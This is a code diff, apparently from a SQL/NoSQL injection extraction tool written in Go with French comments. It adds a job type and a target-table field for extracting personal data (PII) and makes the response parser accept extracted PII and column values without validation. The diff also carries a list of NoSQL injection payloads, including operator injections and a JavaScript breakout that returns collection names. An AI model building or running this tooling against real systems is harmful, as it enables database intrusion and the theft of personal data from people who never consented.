@@ -12,6 +12,7 @@ type ExtractionJob struct {
 	DataType DataType
 	Payload  string
 	Method   string
+	Table    string // table cible (PII)
 }
 
 type DataType = models.DataType
@@ -23,6 +24,7 @@ const (
 	DataTables   = models.DataTables
 	DataColumns  = models.DataColumns
 	DataDump     = models.DataDump
+	DataPII      = models.DataPII
 )
 
 // BuildJobs génère les jobs d'extraction selon le DBMS et le type de vuln.
@@ -150,11 +152,11 @@ func errorDefs() []errorDef {
 
 func nosqlJobs() []ExtractionJob {
 	return []ExtractionJob{
-		{DataDump, `{"$regex":".*"}`, "nosql"},
-		{DataDump, `{"$ne":null}`, "nosql"},
-		{DataDump, `{"$gt":""}`, "nosql"},
-		{DataUser, `{"username":{"$regex":".*"}}`, "nosql"},
-		{DataTables, `0]; return db.getCollectionNames(); var a=[0`, "nosql"},
+		{DataType: DataDump, Payload: `{"$regex":".*"}`, Method: "nosql"},
+		{DataType: DataDump, Payload: `{"$ne":null}`, Method: "nosql"},
+		{DataType: DataDump, Payload: `{"$gt":""}`, Method: "nosql"},
+		{DataType: DataUser, Payload: `{"username":{"$regex":".*"}}`, Method: "nosql"},
+		{DataType: DataTables, Payload: `0]; return db.getCollectionNames(); var a=[0`, Method: "nosql"},
 	}
 }
 
@@ -191,6 +193,12 @@ func ParseResponse(body, payload, method string, dtype DataType) (string, bool) 
 	reTilde := regexp.MustCompile(`~([^~]+)~`)
 	if m := reTilde.FindStringSubmatch(body); len(m) > 1 {
 		val := strings.TrimSpace(m[1])
+		if dtype == models.DataPII || dtype == DataPII {
+			return val, true
+		}
+		if dtype == models.DataColumns || dtype == DataColumns {
+			return val, true
+		}
 		if isValidExtractedValue(dtype, val, payload) {
 			return val, true
 		}
